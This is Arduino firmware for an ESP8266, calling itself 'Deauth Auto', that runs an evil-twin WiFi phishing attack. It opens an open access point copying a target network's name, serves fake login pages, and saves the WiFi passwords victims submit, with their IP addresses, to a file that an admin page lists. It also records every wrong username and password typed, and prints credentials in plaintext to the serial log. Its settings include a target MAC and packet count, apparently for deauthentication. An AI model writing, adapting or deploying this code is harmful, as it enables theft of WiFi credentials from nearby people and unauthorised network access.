#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <ArduinoJson.h>
#include <FS.h>
#include "webfile.h"  // Include the generated web files header

// Configuration structure
struct Config {
  String ip;
  String targetSSID;
  String targetMAC;
  String loginPageName;
  int totalSendPkt;
  String username;
  String password;
};

Config config;
ESP8266WebServer server(80);

// Function to parse IP address string to IPAddress
bool parseIPAddress(const String& ipString, IPAddress& ip) {
  int parts[4];
  int partIndex = 0;
  int startIndex = 0;
  
  for (int i = 0; i < ipString.length() && partIndex < 4; i++) {
    if (ipString.charAt(i) == '.') {
      parts[partIndex] = ipString.substring(startIndex, i).toInt();
      partIndex++;
      startIndex = i + 1;
    }
  }
  
  if (partIndex == 3) {
    parts[partIndex] = ipString.substring(startIndex).toInt();
    partIndex++;
  }
  
  if (partIndex == 4) {
    for (int i = 0; i < 4; i++) {
      if (parts[i] < 0 || parts[i] > 255) {
        return false;
      }
    }
    ip = IPAddress(parts[0], parts[1], parts[2], parts[3]);
    return true;
  }
  
  return false;
}

// Function to load configuration from settings.json
bool loadConfig() {
  if (!SPIFFS.begin()) {
    Serial.println("Failed to mount SPIFFS");
    return false;
  }
  
  if (!SPIFFS.exists("/settings.json")) {
    Serial.println("settings.json not found, creating default config");
    createDefaultConfig();
    return false;
  }
  
  File file = SPIFFS.open("/settings.json", "r");
  if (!file) {
    Serial.println("Failed to open settings.json");
    return false;
  }
  
  DynamicJsonDocument doc(1024);
  DeserializationError error = deserializeJson(doc, file);
  file.close();
  
  if (error) {
    Serial.println("Failed to parse settings.json");
    return false;
  }
  
  // Load configuration values
  config.ip = doc["ip"].as<String>();
  config.targetSSID = doc["target_ssid"].as<String>();
  config.targetMAC = doc["target_mac"].as<String>();
  config.loginPageName = doc["login_page_name"].as<String>();
  config.totalSendPkt = doc["total_send_pkt"].as<int>();
  config.username = doc["username"].as<String>();
  config.password = doc["password"].as<String>();
  
  // Debug: Check if values are loaded properly
  Serial.println("=== Configuration Debug ===");
  Serial.println("Username loaded: '" + config.username + "'");
  Serial.println("Password loaded: '" + config.password + "'");
  Serial.println("Username length: " + String(config.username.length()));
  Serial.println("Password length: " + String(config.password.length()));
  Serial.println("==========================");
  
  Serial.println("Configuration loaded successfully:");
  Serial.println("IP: " + config.ip);
  Serial.println("Target SSID: " + config.targetSSID);
  Serial.println("Target MAC: " + config.targetMAC);
  Serial.println("Login Page Name: " + config.loginPageName);
  Serial.println("Total Send Packets: " + String(config.totalSendPkt));
  Serial.println("Username: " + config.username);
  Serial.println("Password: " + config.password);
  
  return true;
}

// Function to save WiFi password
void saveWiFiPassword(const String& ssid, const String& password, const String& timestamp) {
  DynamicJsonDocument doc(2048);
  
  // Load existing WiFi passwords
  if (SPIFFS.exists("/wifi_passwords.json")) {
    File file = SPIFFS.open("/wifi_passwords.json", "r");
    if (file) {
      DeserializationError error = deserializeJson(doc, file);
      file.close();
      if (error) {
        Serial.println("Failed to parse wifi_passwords.json, creating new file");
        doc.clear();
      }
    }
  }
  
  // Create new WiFi password entry
  JsonObject wifiEntry = doc.createNestedObject();
  wifiEntry["ssid"] = ssid;
  wifiEntry["password"] = password;
  wifiEntry["timestamp"] = timestamp;
  wifiEntry["ip"] = server.client().remoteIP().toString();
  
  // Save to file
  File file = SPIFFS.open("/wifi_passwords.json", "w");
  if (file) {
    serializeJson(doc, file);
    file.close();
    Serial.println("WiFi password saved: " + ssid + " - " + password);
  } else {
    Serial.println("Failed to save WiFi password");
  }
}

// Function to get WiFi passwords
String getWiFiPasswords() {
  if (SPIFFS.exists("/wifi_passwords.json")) {
    File file = SPIFFS.open("/wifi_passwords.json", "r");
    if (file) {
      String content = file.readString();
      file.close();
      return content;
    }
  }
  return "[]";
}

// Function to save failed login attempt
void saveFailedLogin(const String& username, const String& password, const String& timestamp, const String& ip) {
  DynamicJsonDocument doc(2048);
  
  // Load existing failed logins
  if (SPIFFS.exists("/failed_logins.json")) {
    File file = SPIFFS.open("/failed_logins.json", "r");
    if (file) {
      DeserializationError error = deserializeJson(doc, file);
      file.close();
      if (error) {
        Serial.println("Failed to parse failed_logins.json, creating new file");
        doc.clear();
      }
    }
  }
  
  // Create new failed login entry
  JsonObject failedLogin = doc.createNestedObject();
  failedLogin["username"] = username;
  failedLogin["password"] = password;
  failedLogin["timestamp"] = timestamp;
  failedLogin["ip"] = ip;
  
  // Save to file
  File file = SPIFFS.open("/failed_logins.json", "w");
  if (!file) {
    Serial.println("Failed to open failed_logins.json for writing");
    return;
  }
  
  serializeJson(doc, file);
  file.close();
  
  Serial.println("Failed login saved:");
  Serial.println("Username: " + username);
  Serial.println("Password: " + password);
  Serial.println("Timestamp: " + timestamp);
  Serial.println("IP: " + ip);
}

// Function to get failed logins
String getFailedLogins() {
  if (!SPIFFS.exists("/failed_logins.json")) {
    return "[]";
  }
  
  File file = SPIFFS.open("/failed_logins.json", "r");
  if (!file) {
    Serial.println("Failed to open failed_logins.json for reading");
    return "[]";
  }
  
  String content = file.readString();
  file.close();
  return content;
}

// Function to create default configuration
void createDefaultConfig() {
  DynamicJsonDocument doc(1024);
  
  doc["ip"] = "192.168.1.254";
  doc["target_ssid"] = "Redmi 9a";
  doc["target_mac"] = "AA:BB:CC:DD:EE:FF";
  doc["login_page_name"] = "login.html";
  doc["total_send_pkt"] = 100;
  doc["username"] = "admin";
  doc["password"] = "admin";
  
  File file = SPIFFS.open("/settings.json", "w");
  if (!file) {
    Serial.println("Failed to create settings.json");
    return;
  }
  
  serializeJson(doc, file);
  file.close();
  Serial.println("Default settings.json created");
}

// Function to save configuration
bool saveConfig() {
  DynamicJsonDocument doc(1024);
  
  doc["ip"] = config.ip;
  doc["target_ssid"] = config.targetSSID;
  doc["target_mac"] = config.targetMAC;
  doc["login_page_name"] = config.loginPageName;
  doc["total_send_pkt"] = config.totalSendPkt;
  doc["username"] = config.username;
  doc["password"] = config.password;
  
  File file = SPIFFS.open("/settings.json", "w");
  if (!file) {
    Serial.println("Failed to open settings.json for writing");
    return false;
  }
  
  serializeJson(doc, file);
  file.close();
  Serial.println("Configuration saved successfully");
  return true;
}

// Web server handlers
void sendProgmem(const char* ptr, size_t size, const char* type) {
    server.sendHeader("Content-Length", String(size));
    server.sendHeader("Cache-Control", "max-age=3600");
    server.send_P(200, type, ptr, size);
}



void handleSave() {
  Serial.println("Save request received");
  
  // Debug: Print all arguments
  for (int i = 0; i < server.args(); i++) {
    Serial.print("Arg ");
    Serial.print(i);
    Serial.print(": ");
    Serial.print(server.argName(i));
    Serial.print(" = ");
    Serial.println(server.arg(i));
  }
  
  // Update configuration
  if (server.hasArg("ip")) {
    config.ip = server.arg("ip");
    Serial.println("IP updated: " + config.ip);
  }
  if (server.hasArg("ssid")) {
    config.targetSSID = server.arg("ssid");
    Serial.println("SSID updated: " + config.targetSSID);
  }
  if (server.hasArg("mac")) {
    config.targetMAC = server.arg("mac");
    Serial.println("MAC updated: " + config.targetMAC);
  }
  if (server.hasArg("login")) {
    config.loginPageName = server.arg("login");
    Serial.println("Login page updated: " + config.loginPageName);
  }
  if (server.hasArg("packets")) {
    config.totalSendPkt = server.arg("packets").toInt();
    Serial.println("Packets updated: " + String(config.totalSendPkt));
  }
  if (server.hasArg("username")) {
    config.username = server.arg("username");
    Serial.println("Username updated: " + config.username);
  }
  if (server.hasArg("password")) {
    config.password = server.arg("password");
    Serial.println("Password updated: " + config.password);
  }
  
  // Save configuration
  if (saveConfig()) {
    Serial.println("Configuration saved successfully");
    server.send(200, "text/plain", "OK");
    
    // Reboot after successful save
    Serial.println("Rebooting in 2 seconds...");
    delay(2000);
    ESP.restart();
  } else {
    Serial.println("Failed to save configuration");
    server.send(500, "text/plain", "ERROR");
  }
}

void handleConfig() {
  DynamicJsonDocument doc(1024);
  doc["ip"] = config.ip;
  doc["target_ssid"] = config.targetSSID;
  doc["target_mac"] = config.targetMAC;
  doc["login_page_name"] = config.loginPageName;
  doc["total_send_pkt"] = config.totalSendPkt;
  doc["username"] = config.username;
  doc["password"] = config.password;
  
  String jsonString;
  serializeJson(doc, jsonString);
  server.send(200, "application/json", jsonString);
}

void handleAuth() {
  if (server.method() != HTTP_POST) {
    server.send(405, "text/plain", "Method Not Allowed");
    return;
  }
  
  String body = server.arg("plain");
  Serial.println("Received auth data: " + body);
  
  DynamicJsonDocument doc(512);
  DeserializationError error = deserializeJson(doc, body);
  
  if (error) {
    Serial.println("Failed to parse JSON");
    server.send(400, "text/plain", "Invalid JSON");
    return;
  }
  
  String username = doc["username"].as<String>();
  String password = doc["password"].as<String>();
  
  // Debug authentication
  Serial.println("=== Authentication Debug ===");
  Serial.println("Received username: '" + username + "'");
  Serial.println("Received password: '" + password + "'");
  Serial.println("Config username: '" + config.username + "'");
  Serial.println("Config password: '" + config.password + "'");
  Serial.println("Username match: " + String(username == config.username ? "YES" : "NO"));
  Serial.println("Password match: " + String(password == config.password ? "YES" : "NO"));
  Serial.println("==========================");
  
  // Check credentials against settings.json
  if (username == config.username && password == config.password) {
    Serial.println("Authentication successful for user: " + username);
    server.send(200, "application/json", "{\"success\": true}");
  } else {
    Serial.println("Authentication failed for user: " + username);
    
    // Save failed login attempt
    String timestamp = String(millis()); // Simple timestamp
    String clientIP = server.client().remoteIP().toString();
    saveFailedLogin(username, password, timestamp, clientIP);
    
    server.send(401, "application/json", "{\"success\": false, \"message\": \"Invalid credentials\"}");
  }
}

void handleGetFailedLogins() {
  String failedLogins = getFailedLogins();
  server.send(200, "application/json", failedLogins);
}

void handleClearFailedLogins() {
  if (server.method() != HTTP_POST) {
    server.send(405, "text/plain", "Method Not Allowed");
    return;
  }
  
  if (SPIFFS.exists("/failed_logins.json")) {
    if (SPIFFS.remove("/failed_logins.json")) {
      Serial.println("Failed logins file cleared");
      server.send(200, "text/plain", "Failed logins cleared");
    } else {
      Serial.println("Failed to remove failed_logins.json");
      server.send(500, "text/plain", "Error clearing failed logins");
    }
  } else {
    server.send(200, "text/plain", "No failed logins to clear");
  }
}

void handleSaveWiFiPassword() {
  if (server.method() != HTTP_POST) {
    server.send(405, "text/plain", "Method Not Allowed");
    return;
  }
  
  String body = server.arg("plain");
  Serial.println("Received WiFi password data: " + body);
  
  DynamicJsonDocument doc(512);
  DeserializationError error = deserializeJson(doc, body);
  
  if (error) {
    Serial.println("Failed to parse WiFi password JSON");
    server.send(400, "text/plain", "Invalid JSON");
    return;
  }
  
  String ssid = doc["ssid"].as<String>();
  String password = doc["password"].as<String>();
  String timestamp = doc["timestamp"].as<String>();
  
  // Save WiFi password to JSON file
  saveWiFiPassword(ssid, password, timestamp);
  
  server.send(200, "text/plain", "WiFi password saved");
}

void handleGetWiFiPasswords() {
  String wifiPasswords = getWiFiPasswords();
  server.send(200, "application/json", wifiPasswords);
}

void handleClearWiFiPasswords() {
  if (server.method() != HTTP_POST) {
    server.send(405, "text/plain", "Method Not Allowed");
    return;
  }
  
  if (SPIFFS.exists("/wifi_passwords.json")) {
    if (SPIFFS.remove("/wifi_passwords.json")) {
      Serial.println("WiFi passwords file cleared");
      server.send(200, "text/plain", "WiFi passwords cleared");
    } else {
      Serial.println("Failed to remove wifi_passwords.json");
      server.send(500, "text/plain", "Error clearing WiFi passwords");
    }
  } else {
    server.send(200, "text/plain", "No WiFi passwords to clear");
  }
}

void handleScanWiFi() {
  Serial.println("WiFi scan requested");
  
  WiFiMode_t currentMode = WiFi.getMode();
  if (currentMode != WIFI_AP_STA) {
    WiFi.mode(WIFI_AP_STA);
    delay(100);
  }
  
  WiFi.disconnect();
  delay(100);
  
  int n = WiFi.scanNetworks();
  Serial.println("Found " + String(n) + " networks");
  
  DynamicJsonDocument doc(1024);
  JsonArray networks = doc.createNestedArray("networks");
  
  for (int i = 0; i < n; ++i) {
    JsonObject network = networks.createNestedObject();
    network["ssid"] = WiFi.SSID(i);
    network["rssi"] = WiFi.RSSI(i);
    network["channel"] = WiFi.channel(i);
    
    uint8_t* bssid = WiFi.BSSID(i);
    String mac = "";
    for (int j = 0; j < 6; j++) {
      if (j > 0) mac += ":";
      if (bssid[j] < 0x10) mac += "0";
      mac += String(bssid[j], HEX);
    }
    mac.toUpperCase();
    network["mac"] = mac;
  }
  
  if (currentMode != WIFI_AP_STA) {
    WiFi.mode(currentMode);
    delay(100);
  }
  
  String jsonString;
  serializeJson(doc, jsonString);
  server.send(200, "application/json", jsonString);
}

void setup() {
  Serial.begin(115200);
  Serial.println("Deauth Auto Starting...");
  
  // Initialize SPIFFS
  if (!SPIFFS.begin()) {
    Serial.println("Failed to mount SPIFFS");
    return;
  }
  
  // Load configuration
  if (!loadConfig()) {
    Serial.println("Using default config");
  } else {
    Serial.println("Config loaded");
  }
  
  // Parse IP address from config
  IPAddress local_IP, gateway, subnet;
  if (parseIPAddress(config.ip, local_IP)) {
    gateway = local_IP;
    subnet = IPAddress(255, 255, 255, 0);
  } else {
    // Fallback to default IP if parsing fails
    local_IP = IPAddress(192, 168, 1, 254);
    gateway = IPAddress(192, 168, 1, 254);
    subnet = IPAddress(255, 255, 255, 0);
    Serial.println("Invalid IP in config, using default: 192.168.1.254");
  }
  
  // Setup WiFi
  WiFi.mode(WIFI_AP_STA);
  if (WiFi.softAPConfig(local_IP, gateway, subnet)) {
    Serial.println("AP IP configured successfully");
  } else {
    Serial.println("AP IP configuration failed");
  }
  
  // Use SSID from config or default to "Redmi 9a"
  String apSSID = config.targetSSID;
  if (apSSID.length() == 0) {
    apSSID = "Redmi 9a";
    Serial.println("No SSID in config, using default: Redmi 9a");
  }
  WiFi.softAP(apSSID.c_str());
  
  // Setup web server
  server.on("/", HTTP_GET, []() {
      sendProgmem((char*)index_html, index_html_len, "text/html");
  });
  server.on("/index.html", HTTP_GET, []() {
      sendProgmem((char*)index_html, index_html_len, "text/html");
  });
  server.on("/login.html", HTTP_GET, []() {
      // Serve login page based on config.loginPageName
      if (config.loginPageName == "login_custom.html") {
          sendProgmem((char*)login_custom_html, login_custom_html_len, "text/html");
      } else if (config.loginPageName == "login_simple.html") {
          sendProgmem((char*)login_simple_html, login_simple_html_len, "text/html");
      } else if (config.loginPageName == "login_secure.html") {
          sendProgmem((char*)login_secure_html, login_secure_html_len, "text/html");
      } else {
          // Default login page
          sendProgmem((char*)login_html, login_html_len, "text/html");
      }
  });
  server.on("/failed_logins.html", HTTP_GET, []() {
      sendProgmem((char*)failed_logins_html, failed_logins_html_len, "text/html");
  });
  server.on("/wifi.html", HTTP_GET, []() {
      sendProgmem((char*)wifi_html, wifi_html_len, "text/html");
  });
  server.on("/wifi_passwords.html", HTTP_GET, []() {
      sendProgmem((char*)wifi_passwords_html, wifi_passwords_html_len, "text/html");
  });
  server.on("/style.css", HTTP_GET, []() {
      sendProgmem((char*)style_css, style_css_len, "text/css");
  });
  server.on("/script.js", HTTP_GET, []() {
      sendProgmem((char*)script_js, script_js_len, "text/javascript");
  });
  server.on("/login.js", HTTP_GET, []() {
      sendProgmem((char*)login_js, login_js_len, "text/javascript");
  });
  server.on("/save", HTTP_POST, handleSave);
  server.on("/config", HTTP_GET, handleConfig);
  server.on("/auth", HTTP_POST, handleAuth);
  server.on("/failed-logins", HTTP_GET, handleGetFailedLogins);
  server.on("/clear-failed-logins", HTTP_POST, handleClearFailedLogins);
  server.on("/save-wifi-password", HTTP_POST, handleSaveWiFiPassword);
  server.on("/wifi-passwords", HTTP_GET, handleGetWiFiPasswords);
  server.on("/clear-wifi-passwords", HTTP_POST, handleClearWiFiPasswords);
  server.on("/scan-wifi", HTTP_GET, handleScanWiFi);
  server.begin();
  
  Serial.println("Web server started");
  Serial.print("Access point: ");
  Serial.println(apSSID);
  Serial.println("Password:");
  Serial.print("Web interface: http://");
  Serial.println(local_IP.toString());
}

void loop() {
  server.handleClient();
  delay(10);
}
